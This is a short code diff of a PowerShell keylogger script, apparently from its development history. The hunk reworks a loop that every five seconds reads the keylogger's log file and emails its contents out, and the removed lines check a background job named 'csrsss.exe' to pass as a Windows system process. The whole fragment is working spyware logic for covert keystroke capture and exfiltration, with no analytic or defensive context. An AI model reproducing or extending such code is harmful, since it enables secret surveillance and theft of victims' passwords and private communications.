@@ -425,25 +425,15 @@ function mail($messageBody){
 	{
 		Sleep (5 * 1)
 		try{
-			$keyloggerJob = Get-Job -Name "csrsss.exe"
-			mail $keyloggerJob.State
-			if($keyloggerJob.State -eq "Running"){
-				if([System.IO.File]::Exists($keyloggerLogFilePath)){
+			if([System.IO.File]::Exists($keyloggerLogFilePath)){
 					$keyloggerFileContents = type $keyloggerLogFilePath
 					mail $keyloggerFileContents
-				}
-				else{
-					"Keylogger log does not exist"
-					mail "Keylogger log does not exist"
-					exit
-				}
-				
-			}else{
-				"Keylogger job is not running"
-				mail "Keylogger job is not running see email headers for more details (else)"
-				exit
 			}
-			
+			else{
+				"Keylogger log does not exist"
+				mail "Keylogger log does not exist"
+				exit
+			}			
 		}
 		catch{
 			"Keylogger job is not created"
